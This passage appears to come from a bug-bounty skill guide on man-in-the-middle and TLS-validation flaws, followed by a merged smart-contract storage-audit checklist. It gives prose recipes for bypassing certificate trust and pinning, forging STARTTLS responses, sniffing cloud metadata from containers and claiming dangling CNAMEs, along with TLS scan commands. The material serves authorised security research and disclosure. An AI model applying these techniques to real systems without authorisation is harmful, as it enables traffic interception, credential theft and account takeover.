testssl.sh --fast target.com | grep -E 'CRITICAL|HIGH|POODLE|DROWN|heartbleed'
openssl s_client -connect target:443 -servername target </dev/null 2>/dev/null \
  | openssl x509 -noout -dates -subject -issuer
# Offered != exploitable: weak ciphers need a real downgrade/decrypt PoC (#263553).
```

---

## Common Root Causes

1. **Download without integrity verification (CWE-494 / CWE-829).** Code, JARs, installers, or update manifests are fetched over plaintext and trusted implicitly — the dominant RCE pattern (#506161 #608620 #186352 #982130 #272231 #181214). The fix is HTTPS *plus* signature/checksum validation; in #982130 the cleartext manifest itself defined the download URL.

2. **Transport of secrets over plaintext.** Reset tokens, verification links, and session cookies are generated with `http://` or without `Secure`, so any on-path observer captures a usable credential (#206650 #224287 #123748). Automattic's case was compounded by a third-party tracker hop that also used http.

3. **Trust model redirected by configuration.** CA paths, CA-bundle environment variables, or attacker-set pins silently redefine what "trusted" means, with no warning (#3120969 #3418776 #3686259). `--capath` / `CURL_CA_BUNDLE` accept arbitrary directories; Monero's `set_daemon` ignored the pin list entirely.

4. **Hostname / certificate verification skipped or raced.** CN not checked (#337680), CN mismatch on an in-scope host (#504507), session reuse emitting before hostname verification (#811502), or session tickets under the wrong SSL context (#1129529). The TLS stack did encryption but not authentication.

5. **Proxy/TLS-termination assumes the peer is honest.** ProxyAgent, `https-proxy-agent`, and opportunistic STARTTLS trust responses received before/around the TLS handshake (#1599063 #541502 #1334763 #953219 #519582). An unchecked non-200 CONNECT (#541502) sends Basic auth in the clear.

6. **Enforcement layers can be overridden.** AV/TLS-intercepting products strip HSTS (#461780); unvalidated Host + wildcard cert + user-controlled content collapses origin boundaries (#291522). A defense disabled by the product meant to enforce it is worse than none.

7. **Network defaults grant interception capability.** `CAP_NET_RAW`, `hostNetwork:true`, IPv6 rogue router advertisements, and exposed LoadBalancer/ExternalIPs let a workload become on-path (#899103 #819717 #764986). Default-capability problems, not app bugs.

8. **Stale defenses and hygiene assumptions.** Weak ciphers retained for compatibility (#263553), mixed content in HTTPS pages (#437800 #503699 #700091), dangling DNS pointing at claimable providers (#340580) — all "we forgot to clean up" issues.

9. **Unverified handshake / response fields.** Missing `Sec-WebSocket-Accept` (#3917775), first TFTP response from any IP (#4103651), `Curl_socketpair()` TOCTOU gap (#3148937), Node TLS `'session'` firing before hostname verification (#811502). Also plain `git://` clones without a pinned commit (#181214).

---

## Bypass Techniques

### Trust-store and pinning bypasses

- Supply a **fake root CA** via `--capath` / `CURLOPT_CAPATH` or `CURL_CA_BUNDLE` — the client trusts any server signed by it (#3120969 #3418776).
- Re-point the **daemon address / CA fingerprint** so a stored pin list (`ssl_allowed_fingerprints`) is silently ignored — wallet↔daemon MITM (#3686259); the report's "ASCII-copy block" copied an empty fingerprint vector, disabling the check.
- Use a **valid certificate for an entirely different domain**: self-signed certs warn, but a legitimate-but-wrong CN can pass (#337680).
- Force **TLS 1.3 session reuse** so a cached session is accepted despite failed hostname verification (#811502); mix up **proxy vs destination session-ticket contexts** (#1129529).

### Proxy and transport bypasses

- Return a **non-200 CONNECT** and watch for the socket used without TLS upgrade, leaking Basic auth before encryption (#541502).
- Present your own cert through a **ProxyAgent** to invisibly MITM the "secure" channel (#1599063) — the proxy terminates TLS and re-encrypts with no warning.
- **Pipeline forged cleartext responses** into the STARTTLS response so they are interpreted as encrypted commands (#1334763); exploit a permissive SMTP relay for credential capture (#953219 #519582).
- Configure an **attacker-controlled proxy** in admin settings and use match-and-replace to tamper with update manifests in flight (#982130).
- Use **plain `git://`** or http installer URLs with no integrity check (#181214 #186352 #272231).

### Enforcement and origin bypasses

- Combine **wildcard certificate + unvalidated Host header + user-controlled files + unfiltered reflection** to run JS on the HTTPS login page (#291522).
- Override **HSTS** via a product that ignores it, plus social-engineering the certificate warning (#461780).
- Land **active mixed content** (scripts) rather than passive (images) to rewrite the DOM and steal data (#503699 #437800 #700091).
- **Claim a dangling CNAME** so interception happens on a trusted origin with a valid-looking certificate; Fastly required no DNS ownership proof (#340580).

### Network-position bypasses

- Use **CAP_NET_RAW in a hostNetwork container** to sniff/inject host plaintext, including `169.254.169.254` metadata and SSH keys (#899103).
- Exploit **IPv6 rogue router advertisements** against IPv4-only clusters to become default router (#819717).
- Use a **LoadBalancer or ExternalIPs service** to intercept in-cluster traffic (#764986).
- Win a **first-response race**: a TFTP responder from another IP can become the pinned peer (#4103651); `Curl_socketpair()` has a bind/listen gap where another process connects first (#3148937).
- Operate a **WebSocket relay server** to snoop/tamper with raw messages when the channel lacks handshake authentication (#423467 #3917775).

### Triage bypasses that will NOT survive (do not rely on these)

- "Missing HSTS" with no demonstrated downgrade capture — Info/Low; #461780 paid only because a product *actively stripped* HSTS.
- "Weak cipher supported" without a decrypt PoC — #263553 was closed informative for exactly this.
- "Domain not in cert SAN" on a host with no real users — low value unless in-scope and actively used (#504507).
- Passive mixed content with no script execution — Low/Info. Missing CAA — absence does not enable issuance; not attacker-demonstrable.

---

## Gate 0 Validation

Before writing any report, confirm all four:

1. **Is there a real victim and a real action?** A plaintext URL is a condition, not a
   finding. Show the interception doing something: a captured reset token replayed to an
   account (#206650), attacker code executing after a tampered update (#982130 #186352), a
   decrypted session cookie used for ATO (#123748), or a relayed WebSocket message
   (#423467). "It uses http://" alone is best-practice noise.

2. **Can you demonstrate the broken check, not just assert it?** For certificate-validation
   bugs, show the fake CA / wrong-CN cert / alternate fingerprint actually being accepted
   with a screenshot or transcript (#3120969 #337680 #3686259). For proxy/STARTTLS bugs,
   show the forged response being consumed (#1334763 #541502). For network bugs, show the
   packet capture and injected response (#899103). For MITM-in-the-wild scenarios, show
   the on-path position (MitMProxy intercept, relay server, packet capture).

3. **Scope gate — does the program accept this class?** Email-auth, missing headers,
   weak-TLS-without-exploit, and mixed content are commonly OOS. Quote the in-scope line.
   #263553 is a textbook "correctly closed informative" case; do not replicate it without
   a PoC. Favor code-execution, token-theft, and validation-bypass framings that programs
   treat as in-scope security bugs. Note that several reports here were closed with no
   bounty (#504507 #123748 #3917775 #3148937) despite being interesting — severity is a
   program decision.

4. **Is it reproducible in 10 minutes by a second person?** Provide the fake CA commands,
   the proxy config, the exact reset-link flow, or the packet-capture steps.
   `netstat`/`tcpdump` output with no interpretation is not a PoC; neither is a video with
   no reproducible steps. Tear down any claimed resource/subdomain and any live attacker
   content after PoC (#340580).

**Severity calibration (conservative, grounded in the corpus):**

| Finding class | Realistic severity | Representative reports |
|---|---|---|
| Plaintext update/install pipeline → RCE as root / code execution | High–Critical | #982130 CVSS 7.6, #608620 CVSS 7.1, #506161 $1,000, #186352 $300 |
| CA trust-model hijack / pinning bypass / hostname-verification bypass in a widely used client | High–Critical | #3418776 Critical, #3120969 High, #811502 High, #3686259 high |
| ProxyAgent / proxy TLS flaw enabling invisible MITM | High | #1599063 CVSS 7.4 $1,000 |
| Reset-token / verification link over plaintext → ATO | High | #206650 High, #224287 Low |
| Origin confusion → active-MitM XSS / session theft | Medium–High | #291522 $500, #503699 Low |
| Container/K8s network MitM → host root | Medium–High | #899103 #764986 CVSS 6.0–6.6 |
| HSTS stripping with PoC / STARTTLS forgery | Medium | #461780 Medium, #1334763 CVSS 5.3 |
| Mixed content, cookie-without-Secure | Low–Medium, scope-dependent | #461780 Medium, #123748 None, #437800 Low |
| Weak-cipher support, passive mixed content, cert SAN mismatch with no victims | Info/Low — generally do not submit | #263553 informative, #504507 None |

---

## Real Impact Examples

### Scenario A — Plaintext update manifest to RCE as root (Concrete CMS / Phabricator / PortSwigger pattern)

An application fetched its update scheme JSON from `www.concrete5.org` over plain HTTP.
The JSON defined the download URL, and the application had an admin-configurable outgoing
proxy. By pointing the proxy at Burp, rewriting the version string to force a response, and
replacing the "Direct Download URL" with an attacker host, the researcher made the app
download and write an arbitrary file into the writable `updates` directory, yielding
remote code execution (#982130, High CVSS 7.6). Preconditions: Administrator privileges
and a writable `updates` directory. The same class appeared in Phabricator's
`install_rhel-derivs.sh`, which downloaded binaries via HTTP and ran them under sudo — a
plaintext MITM gave RCE as root (#186352, $300) — and PortSwigger's JAR resolution over
HTTP enabled malicious artifact substitution (#506161, $1,000). The industrial-scale
version (#608620) touched Apache, Eclipse, Pivotal/Spring, RedHat, Jenkins, JetBrains,
Gradle, PayPal and Netflix, CVSS 7.1.

### Scenario B — CA trust-model hijack and invisible proxy MITM (curl / Undici pattern)

The `--capath` / `CURLOPT_CAPATH` option accepted any directory: supplying a directory with
a fake root CA made curl trust HTTPS endpoints signed by that CA, exposing decrypted data
with no user interaction (#3120969, High). The `CURL_CA_BUNDLE` environment variable
silently redefined the whole chain of trust with no warning (#3418776, Critical). In the
Node ecosystem, Undici's ProxyAgent allowed "trivial MitM of all HTTPS traffic sent to a
proxy" — the proxy could invisibly intercept "secure" traffic (#1599063, High CVSS 7.4,
$1,000) — while Node's TLS session reuse could emit cached sessions before hostname
verification failed (#811502, High). Monero's `set_daemon` RPC silently ignored
`ssl_allowed_fingerprints`, bypassing wallet↔daemon pinning (#3686259, high). Together these
show that a single unchecked trust decision turns HTTPS into plaintext.

### Scenario C — Reset-token capture to mass account takeover (Automattic / Weblate pattern)

A password-reset email was delivered through an `http://` Mandrill tracking link that
redirected to `http://en.instagram-brand.com/register/reset/<token>?email=<email>`. The
reset token traveled in cleartext, so an on-path attacker could harvest links and perform
mass account takeovers (#206650, High). Weblate's confirmation links showed the same flaw:
an http link that auto-logged the user in on click, letting an attacker who stole the token
take over the account (#224287, Low). The root cause is trivial — the link generator used
`http://` — but the impact is full account compromise. The fix is equally simple: issue the
link with https and do not auto-authenticate on click.

### Scenario D — On-path metadata tamper to host root (Kubernetes pattern)

A container with `hostNetwork=true` retained `CAP_NET_RAW`, letting an attacker listen to
all host traffic and inject arbitrary traffic. Because the host queried the cloud metadata
service at `http://169.254.169.254` in plaintext to fetch authorized SSH keys, the attacker
manipulated those responses to provision their own key and gain root on the host (#899103,
Medium CVSS 6.0). The report's `netstat` showed a listening service on `:::5000`. Related
flaws let IPv4-only clusters be MITM'd through IPv6 rogue router advertisements (#819717)
and in-cluster traffic be intercepted via LoadBalancer/ExternalIPs services (#764986, CVSS
6.6). The same metadata-targeting technique recurs across GKE, Amazon, Azure and OpenStack
deployments that provision SSH keys over plaintext.

### Scenario E — Trusted-origin spoof and communications takeover (Mail.ru / Shopify / Node.js pattern)

Mail.ru combined a wildcard certificate, an unvalidated `Host:` header, a domain reused for
user-controlled files, and an unfiltered reflected parameter so that an active MitM could
execute JavaScript on `https://account.mail.ru/login` (#291522, $500). The Shopify PoS
research built a relay server for the WebSocket — after finding a listening port via
`netstat` inside the app container — and snooped raw messages to take over communications
(#423467, Medium). curl's missing `Sec-WebSocket-Accept` verification independently
enabled WebSocket session hijack (#3917775). And `registry.nodejs.org`'s dangling CNAME to
Fastly allowed a researcher to claim the subdomain with no DNS ownership proof (#340580) —
a trusted origin that makes any interception or phishing fully credible.

---

## Disclosed Report Citations (30 real IDs)

Every ID below is present in the study pack. Format: Company — title
([H1 #id](https://hackerone.com/reports/id)) — subclass, technique, year/bounty.

1. **Shopify — H1514 Ability to MiTM Shopify PoS Session to Takeover Communications** ([H1 #423467](https://hackerone.com/reports/423467)) — WebSocket relay/session hijack, port-scanning + internal-network + stored, 2018 / Medium.
2. **Automattic — Broken Authentication: security token captured via man in the middle** ([H1 #206650](https://hackerone.com/reports/206650)) — http reset-link token theft → ATO, redirect-handling + subdomain-takeover, 2017 / High.
3. **Node.js — registry.nodejs.org Subdomain Takeover** ([H1 #340580](https://hackerone.com/reports/340580)) — dangling CNAME → Fastly takeover enabling trusted-origin MitM, subdomain-takeover + dependency-confusion, 2018 / None.
4. **curl — MITM via Insecure CA Path Handling (--capath, CURLOPT_CAPATH)** ([H1 #3120969](https://hackerone.com/reports/3120969)) — arbitrary CA-path trust hijack, api-endpoint, 2025 / High.
5. **Concrete CMS — Fetching update JSON scheme over HTTP leads to RCE** ([H1 #982130](https://hackerone.com/reports/982130)) — plaintext update manifest → code execution, proxy-feature + url-fetching + filter-bypass, 2020 / High CVSS 7.6.
6. **Kubernetes — MiTM leading to root privilege escalation using hostNetwork=true (CAP_NET_RAW)** ([H1 #899103](https://hackerone.com/reports/899103)) — metadata sniff/inject → host root, cloud-metadata + internal-network, 2020 / Medium CVSS 6.0.
7. **Mail.ru — Active-MitM XSS via wildcard cert, unvalidated Host, user files, reflection** ([H1 #291522](https://hackerone.com/reports/291522)) — origin confusion → JS execution on HTTPS login, js-source-review + redirect-handling + path-traversal-lfi, 2018 / Medium $500.
8. **sony — Clear Authentication Deficiencies & Potential for Man-in-the-Middle Attacks** ([H1 #2642615](https://hackerone.com/reports/2642615)) — Bluetooth pairing-authentication flaw (WH-1000XM5), search-filter-sort, 2025 / high.
9. **PortSwigger Web Security — Build fetches jars over HTTP** ([H1 #506161](https://hackerone.com/reports/506161)) — dependency download over plaintext (CWE-494/829), public-code-search + proxy-feature, 2019 / Medium $1,000.
10. **PortSwigger Web Security — SMTP interaction theft via MITM** ([H1 #953219](https://hackerone.com/reports/953219)) — opportunistic-TLS credential capture (Postfix CVE-2011-0411), 2020 / Medium.
11. **curl — Curl_socketpair() fallback vulnerable to man-in-the-middle** ([H1 #3148937](https://hackerone.com/reports/3148937)) — bind/listen TOCTOU connection race, public-code-search + server-side-rendering, 2025 / None.
12. **Kaspersky — Web protection component ignores HSTS security policy** ([H1 #461780](https://hackerone.com/reports/461780)) — TLS-product HSTS stripping enabling downgrade, search-filter-sort + redirect-handling, 2018 / Medium.
13. **PortSwigger Web Security — Burp does not validate CN of collaborator certificate** ([H1 #337680](https://hackerone.com/reports/337680)) — hostname/CN validation failure, blind-oob, 2018 / Medium.
14. **Node.js — TLS session reuse can lead to hostname verification bypass** ([H1 #811502](https://hackerone.com/reports/811502)) — session reuse before CN check, js-source-review + stored + filter-bypass, 2020 / High.
15. **FanDuel — Passive mixed content on https://*.fanduel.com** ([H1 #437800](https://hackerone.com/reports/437800)) — passive mixed content, server-side-rendering + dom-based, 2018 / Low $100.
16. **Monero — Hardware Wallets Do Not Check Unlock Time** ([H1 #817245](https://hackerone.com/reports/817245)) — signing logic flaw enabling fund lockup, search-filter-sort, 2020 / Medium CVSS 6.6.
17. **curl — Silent TLS Trust Model Hijacking via CURL_CA_BUNDLE** ([H1 #3418776](https://hackerone.com/reports/3418776)) — env-var CA-bundle trust hijack, path-traversal-lfi + cookie-handling, 2025 / Critical.
18. **Internet Bug Bounty — Industry-Wide MITM Vulnerability Impacting the JVM Ecosystem** ([H1 #608620](https://hackerone.com/reports/608620)) — HTTP dependency resolution in build infrastructure (CWE-494/829), public-code-search + cache-layer, 2019 / High CVSS 7.1.
19. **monero — set_daemon silently ignores ssl_allowed_fingerprints → wallet↔daemon MITM** ([H1 #3686259](https://hackerone.com/reports/3686259)) — certificate-pinning bypass, json-body + stack-fingerprinting + filter-bypass, 2026 / high.
20. **Urban Dictionary — Domain does not Match SSL Certificate** ([H1 #504507](https://hackerone.com/reports/504507)) — cert CN/SAN mismatch on in-scope host, search-filter-sort + server-side-rendering, 2019 / None.
21. **Kubernetes — IPv4 only clusters susceptible to MitM via IPv6 rogue router advertisements** ([H1 #819717](https://hackerone.com/reports/819717)) — rogue RA on-path, internal-network + cloud-metadata + api-endpoint, 2020 / Medium CVSS 6.0.
22. **Phabricator — Fetching binaries over HTTP without verification (RCE as ROOT by MITM)** ([H1 #186352](https://hackerone.com/reports/186352)) — HTTP download-and-execute as root, public-code-search + url-fetching, 2016 / $300.
23. **curl — CVE-2021-22890: TLS 1.3 session ticket proxy host mixup** ([H1 #1129529](https://hackerone.com/reports/1129529)) — proxy/destination SSL-context mixup, proxy-feature + session-attack, 2021 / Low.
24. **curl — CVE-2021-22947: STARTTLS protocol injection via MITM** ([H1 #1334763](https://hackerone.com/reports/1334763)) — pipelined cleartext command injection, url-fetching, 2021 / Medium CVSS 5.3.
25. **Internet Bug Bounty — Undici ProxyAgent vulnerable to MITM** ([H1 #1599063](https://hackerone.com/reports/1599063)) — proxy can invisibly MITM HTTPS, js-source-review + proxy-feature, 2022 / High CVSS 7.4 $1,000.
26. **Node.js third-party modules — https-proxy-agent returns socket without TLS upgrade on non-200 CONNECT** ([H1 #541502](https://hackerone.com/reports/541502)) — pre-TLS secret leakage over proxy, js-source-review + dependency-confusion, 2019 / Medium CVSS 6.1.
27. **Weblate — Email verification over an unencrypted channel** ([H1 #224287](https://hackerone.com/reports/224287)) — http verification link → ATO, redirect-handling + comment-injection, 2017 / Low.
28. **curl — Missing Sec-WebSocket-Accept Verification Enables MITM WebSocket Session Hijacking** ([H1 #3917775](https://hackerone.com/reports/3917775)) — handshake validation failure, websocket + js-source-review + filter-bypass, 2026 / None.
29. **Veris — Not Using Secure Flag on Cookies Could Lead to MITM Session Hijacking** ([H1 #123748](https://hackerone.com/reports/123748)) — cookie without Secure over http, cookie-handling + session-attack, 2016 / None.
30. **Kubernetes — Man in the middle using LoadBalancer or ExternalIPs services** ([H1 #764986](https://hackerone.com/reports/764986)) — in-cluster traffic interception, proxy-feature + api-endpoint + cloud-metadata, 2019 / Medium CVSS 6.6.

---

## Related Skills & Chains

- **`hunt-tls-network`** — the TLS/SSL and DNS recon companion (HSTS, ciphers, AXFR, DMARC,
  dangling CNAME, mTLS, CAA). Use its reality-check table to triage: this skill supplies
  the *interception PoC* that turns "missing HSTS / weak cipher" from Info into a reportable
  finding.
- **`hunt-subdomain`** / **`hunt-subdomain-takeover`** — full depth on claimable CNAMEs;
  chain: dangling record (#340580) → claim provider → serve TLS canary on the trusted
  origin → credential/token phishing.
- **`hunt-ssrf`** — complements server-side fetchers; chain: SSRF URL-fetch primitive →
  point at `http://169.254.169.254` or an internal plaintext service → sniff/tamper as in
  #899103.
- **`hunt-account-takeover`** — the payoff skill; chain: plaintext reset/verification token
  (#206650 #224287) or stolen session cookie (#123748) → account takeover.
- **`hunt-rce`** — the escalation target; chain: unverified update/install download
  (#982130 #186352 #506161 #608620) → arbitrary code execution as root.
- **`hunt-crypto`** — covers weak primitives and key handling; this skill focuses on
  *validation and transport* failures (fake CA, skipped hostname check, pinning bypass).
- **`hunt-oauth`** / **`hunt-open-redirect`** — chain: weak-transport redirect hop carrying
  an OAuth/SSO token or callback → interception on the untrusted leg.
- **`hunt-mobile`** — device/transport angle; chain: Bluetooth pairing flaw (#2642615) or
  hardware-wallet signing flaw (#817245) → session/device takeover.
- **`triage-validation`** — apply the Gate 0 rules: never submit "it uses http://" or
  "weak cipher supported" without a demonstrated interception, a real victim action, and
  a scope quote.


---

## Merged Source Knowledge

This section consolidates **7 unique knowledge blocks** from 1 curated source skills in `hunt-skills/`, `normal-skills/`, and `offensive-skills/`. Blocks overlapping the report-mined sections above were dropped; the complete, globally deduplicated source corpus is archived at `references/source-knowledge.md` (7 unique sections). No source section appears in more than one hunt skill.


### From `hunt-skills/bountyforge/skills/code-sleuth/SKILL.md`

# Code Sleuth — Storage Safety

Analyze EVM smart contracts for storage-safety vulnerabilities.

See also: [[Web3 Audit]], [[Smart Contract Audit]], [[Trust Map]], [[Methodology]]

- memory vs storage confusion
- lost writes (state mutated in memory but never persisted)
- arbitrary or attacker-influenced storage slot writes
- storage collisions across proxy/upgrade layouts
- other storage semantics that can corrupt or invalidate state

Only report issues that have a **clear persistence or state integrity impact**.

---

## Applicability gates

Only proceed if BOTH conditions are true:

1. The contract contains **state-mutating logic** intended to update persistent storage (balances, shares, positions, roles, configuration, accounting totals, escrow mappings, arrays of records, etc.).

2. At least one of the following storage-risk signals is present:

- writes to structs, arrays, or mappings
- inline assembly interacting with storage (`sstore`, `sload`)
- manual or unstructured storage slots (`bytes32` slot constants, StorageSlot libraries)
- proxy, upgradeable, diamond, or delegatecall-based architecture

If these gates are not satisfied, do not force findings.

---

### 1) Inventory storage and storage writers

Map the contract’s persistent state surface before looking for bugs.

- Identify key storage variables such as balances, shares, totals, configuration, roles, escrow mappings, or arrays of user positions.
- Enumerate functions that mutate them:
    - external/public non-view functions
    - internal helpers reachable from those functions
    - privileged admin or upgrade paths
- Identify manual slot usage such as:
    - inline assembly `sstore` / `sload`
    - `StorageSlot` libraries
    - `bytes32` slot constants
    - custom slot arithmetic

Use this inventory to anchor later findings to **specific variables and write paths**.

---

### 2) Lost write / memory-versus-storage omission

Look for cases where storage-backed data is copied into a temporary value, modified, but never written back to storage.

Typical pattern:

- A storage value (struct, mapping element, or array entry) is copied into memory or into a value-type variable.
- The temporary variable is mutated.
- The mutation is never persisted back to the original storage location.

Report a finding only if **all** of the following are true:

- A storage-backed value is copied into a non-storage temporary.
- That temporary is mutated (field assignment, push/pop, arithmetic update, etc.).
- On all reachable paths, the mutated value is **not written back** to the original storage location.
- The surrounding logic indicates that persistence was expected.

Indicators that persistence is expected:

- function name suggests an update
- emitted events imply a state change
- later code reads the state assuming it was updated
- callers rely on the update for accounting or permissions

Do not report if:

- the function is clearly `view` or `pure`
- the code intentionally constructs and returns a modified copy
- the variable is actually a storage reference
- the value is written back through a helper function on all paths

---

### 3) Attacker-influenced storage slot writes

Look for cases where **untrusted input affects which storage slot is written**.

This usually occurs in:

- inline assembly
- custom slot arithmetic
- manual mapping key construction
- delegatecall-based modules or registries

Report a finding only if **all** of the following are true:

- attacker-controlled input influences the final storage slot or key used in a write
- the slot or key is not strictly constrained by validation, allowlists, or provenance checks
- the resulting write can corrupt unrelated or sensitive state

Examples of realistic overwrite targets:

- owner or admin variables
- configuration parameters
- balances or accounting mappings
- implementation or proxy slots
- governance roles

Do not report if:

- the slot is a fixed constant used in a standard pattern
- strong access control prevents untrusted writes
- input-derived keys are tightly validated against trusted state

---

### 4) Upgradeable storage collisions and layout hazards

If the contract uses proxy, upgradeable, or diamond architecture, examine storage layout safety.

Look for situations where storage from multiple implementations or facets could overlap.

High-risk signals include:

- upgrade mechanisms such as `upgradeTo`, `diamondCut`, or admin-controlled implementation changes
- inheritance-heavy storage layouts without reserved gaps
- custom slot constants inconsistent with EIP-1967 or other standard patterns
- facets or modules declaring overlapping state without a shared storage struct pattern

Report layout issues carefully:

- If you can demonstrate an **actual collision**, report it as a concrete vulnerability.
- If there is only a credible risk during upgrades, report it as an **upgrade-safety risk**.

Do not report if:

- the contract has no upgrade mechanism
- storage layout follows a standard pattern with reserved gaps and consistent slot usage

---

### 5) Other storage semantics (only when security-relevant)

Look for storage behaviors that can corrupt or desynchronize state.

Examples include:

- deleting mapping or struct entries while leaving auxiliary state inconsistent (index arrays, totals, role flags)
- manual bit packing or bitmap logic that fails to clear or mask stale bits
- uninitialized storage reads used as authorization or accounting signals

Only report issues where the result could cause:

- privilege escalation
- incorrect accounting
- corrupted configuration
- inaccessible funds
- broken protocol invariants
